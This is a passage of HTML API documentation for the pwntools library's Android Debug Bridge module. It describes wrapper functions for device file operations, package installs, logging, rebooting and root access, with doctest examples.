<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">forward</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.forward" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets up a port to forward to the device.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.getprop">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">getprop</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.getprop" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads a properties from the system property store.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>name</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Optional, read a single property.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">If <code class="docutils literal"><span class="pre">name</span></code> is not specified, a <code class="docutils literal"><span class="pre">dict</span></code> of all properties is returned.
Otherwise, a string is returned with the contents of the named property.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.install">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">install</code><span class="sig-paren">(</span><em>apk</em>, <em>*arguments</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L1338-1364"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.install" title="Permalink to this definition">¶</a></dt>
<dd><p>Install an APK onto the device.</p>
<p>This is a wrapper around &#8216;pm install&#8217;, which backs &#8216;adb install&#8217;.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>apk</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the APK to intall (e.g. <code class="docutils literal"><span class="pre">'foo.apk'</span></code>)</li>
<li><strong>arguments</strong> &#8211; Supplementary arguments to &#8216;pm install&#8217;,
e.g. <code class="docutils literal"><span class="pre">'-l',</span> <span class="pre">'-g'</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.interactive">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">interactive</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.interactive" title="Permalink to this definition">¶</a></dt>
<dd><p>Spawns an interactive shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.isdir">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">isdir</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.isdir" title="Permalink to this definition">¶</a></dt>
<dd><p>Return <code class="xref py py-const docutils literal"><span class="pre">True</span></code> if <code class="docutils literal"><span class="pre">path</span></code> is a on the target device.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="s1">&#39;/init&#39;</span><span class="p">)</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.listdir">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">listdir</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.listdir" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a list containing the entries in the provided directory.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p>This uses the SYNC LIST functionality, which runs in the adbd
SELinux context.  If adbd is running in the su domain (&#8216;adb root&#8217;),
this behaves as expected.</p>
<p class="last">Otherwise, less files may be returned due to restrictive SELinux
policies on adbd.</p>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.logcat">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">logcat</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.logcat" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads the system log file.</p>
<p>By default, causes logcat to exit after reading the file.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>stream</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, the contents are streamed rather than
read in a one-shot manner.  Default is <code class="xref py py-const docutils literal"><span class="pre">False</span></code>.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">If <code class="docutils literal"><span class="pre">stream</span></code> is <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, returns a string containing the log data.
Otherwise, it returns a <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a> connected to the log output.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.makedirs">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">makedirs</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.makedirs" title="Permalink to this definition">¶</a></dt>
<dd><p>Create a directory and all parent directories on the target device.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Silently succeeds if the directory already exists.</p>
</div>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="s1">&#39;/data/local/tmp/this/is/a/directory/heirarchy&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;/data/local/tmp/this/is/a/directory&#39;</span><span class="p">)</span>
<span class="go">[&#39;heirarchy&#39;]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.mkdir">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">mkdir</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.mkdir" title="Permalink to this definition">¶</a></dt>
<dd><p>Create a directory on the target device.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">Silently succeeds if the directory already exists.</p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Directory to create.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/data/local/tmp/mkdir_test&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;/init&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">mkdir failed for /init, File exists</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.packages">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">packages</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.packages" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a list of packages installed on the system</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.pidof">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">pidof</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.pidof" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a list of PIDs for the named process.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.proc_exe">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">proc_exe</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.proc_exe" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the full path of the executable for the provided PID.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.process">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">process</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.process" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a process on the device.</p>
<p>See <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a> documentation for more info.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.process.process</span></code></a> tube.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">root</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">adb</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span> 
<span class="go">Linux version ...</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.product">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">product</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.product" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the device product identifier.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.pull">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">pull</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.pull" title="Permalink to this definition">¶</a></dt>
<dd><p>Download a file from the device.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>remote_path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path or directory of the file on the device.</li>
<li><strong>local_path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to save the file to.
Uses the file&#8217;s name by default.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The contents of the file.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">adb</span><span class="o">.</span><span class="n">pull</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">,</span> <span class="s1">&#39;./proc-version&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">read</span><span class="p">(</span><span class="s1">&#39;./proc-version&#39;</span><span class="p">)</span> 
<span class="go">Linux version ...</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.push">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">push</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Upload a file to the device.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>local_path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the local file to push.</li>
<li><strong>remote_path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path or directory to store the file on the device.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">Remote path of the file.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;./filename&#39;</span><span class="p">,</span> <span class="s1">&#39;contents&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;./filename&#39;</span><span class="p">,</span> <span class="s1">&#39;/data/local/tmp&#39;</span><span class="p">)</span>
<span class="go">&#39;/data/local/tmp/filename&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/data/local/tmp/filename&#39;</span><span class="p">)</span>
<span class="go">&#39;contents&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;./filename&#39;</span><span class="p">,</span> <span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Could not stat &#39;/does/not/exist&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.read">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">read</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Download a file from the device, and extract its contents.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>path</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file on the device.</li>
<li><strong>target</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Optional, location to store the file.
Uses a temporary file by default.</li>
<li><strong>callback</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; See the documentation for
<code class="docutils literal"><span class="pre">adb.protocol.AdbClient.read</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">adb</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">)</span> 
<span class="go">Linux version ...</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;/does/not/exist&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Could not stat &#39;/does/not/exist&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.reboot">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">reboot</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L163-168"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.reboot" title="Permalink to this definition">¶</a></dt>
<dd><p>Reboots the device.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.reboot_bootloader">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">reboot_bootloader</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L163-168"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.reboot_bootloader" title="Permalink to this definition">¶</a></dt>
<dd><p>Reboots the device to the bootloader.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.remount">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">remount</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.remount" title="Permalink to this definition">¶</a></dt>
<dd><p>Remounts the filesystem as writable.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.root">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">root</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.root" title="Permalink to this definition">¶</a></dt>
<dd><p>Restarts adbd as root.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">root</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.setprop">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">setprop</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.setprop" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a property to the system property store.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.shell">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">shell</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.shell" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an interactive shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.uninstall">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">uninstall</code><span class="sig-paren">(</span><em>package</em>, <em>*arguments</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L1366-1377"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.uninstall" title="Permalink to this definition">¶</a></dt>
<dd><p>Uninstall an APK from the device.</p>
<p>This is a wrapper around &#8216;pm uninstall&#8217;, which backs &#8216;adb uninstall&#8217;.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>package</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Name of the package to uninstall (e.g. <code class="docutils literal"><span class="pre">'com.foo.MyPackage'</span></code>)</li>
<li><strong>arguments</strong> &#8211; Supplementary arguments to <code class="docutils literal"><span class="pre">'pm</span> <span class="pre">install'</span></code>, e.g. <code class="docutils literal"><span class="pre">'-k'</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.unlink">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">unlink</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L547-553"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.unlink" title="Permalink to this definition">¶</a></dt>
<dd><p>Unlinks a file or directory on the target device.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="s2">&quot;/does/not/exist&quot;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Could not unlink &#39;/does/not/exist&#39;: Does not exist</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;/data/local/tmp/unlink-test&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="go">False</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s1">&#39;/contents&#39;</span><span class="p">,</span> <span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">PwnlibException</span>: <span class="n">Cannot delete non-empty directory &#39;/data/local/tmp/unlink-test&#39; without recursive=True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">unlink</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">recursive</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">adb</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
<span class="go">False</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.unlock_bootloader">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">unlock_bootloader</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.unlock_bootloader" title="Permalink to this definition">¶</a></dt>
<dd><p>Unlocks the bootloader of the device.</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">This requires physical interaction with the device.</p>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.adb.adb.unroot">
<code class="descclassname">pwnlib.adb.adb.</code><code class="descname">unroot</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/adb/adb.py#L127-136"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.adb.adb.unroot" title="Permalink to this definition">¶</a></dt>
<dd><p>Restarts adbd as AID_SHELL.</p>
</dd></dl>

<dl class="function">
